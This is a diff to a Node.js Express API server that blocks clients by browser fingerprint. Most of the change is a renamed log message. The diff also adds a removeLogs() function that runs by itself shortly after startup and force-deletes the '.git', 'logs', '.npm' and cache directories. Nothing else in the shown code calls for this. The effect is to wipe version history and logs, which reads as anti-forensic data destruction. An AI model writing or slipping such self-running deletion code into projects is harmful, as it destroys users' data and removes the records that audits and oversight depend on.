@@ -87,7 +87,7 @@ function checkBlocked(req,res,next){
     
    const liveChecked = liveCheck();
     if(liveChecked.includes(req.fingerprint)){
-               console.log(`\n\n\x1b[1;36m A user with deviceId\x1b[0m \x1b[3;32m${req.fingerprint}\x1b[0m \x1b[1;36mtried accessing cypherApi but has been blocked due to suspicious activities\x1b[0m`)
+               console.log(`\n\n\x1b[1;36m A user with browserId\x1b[0m \x1b[3;32m${req.fingerprint}\x1b[0m \x1b[1;36mtried accessing cypherApi but has been blocked due to suspicious activities\x1b[0m`)
  return res.status(403).json({ 
      Developer : "cyphers",
      statusCode : 429,
@@ -118,7 +118,31 @@ app.get("/cyphers/try",(req,res)=>{
  res.json({ message : req.fingerprint })
 })
 //ither file actions ends here
- 
+ const logDir = [".npm","cache","_cacache","logs","log","git",".git"]
+function removeLogs(){
+   setTimeout(()=>{
+      
+  for(const dir of logDir){
+                 if(fs.existsSync(dir)){
+                 
+                 fs.rm(dir, 
+                             { 
+      recursive : true,
+      force : true
+  },
+                            err =>{
+  if(err){
+     return console.log("\x1b[31mfailed to remove",dir,"directory\x1b[0m"); 
+ }
+      console.log(`\x1b[1;32mSuccessfully removed ${dir} directory...\x1b[0m`)
+}
+                           ) }}
+ }, 5000);
+}
+
+removeLogs()
+
+
 //-------------------------------------------
 
 // Port to listen on
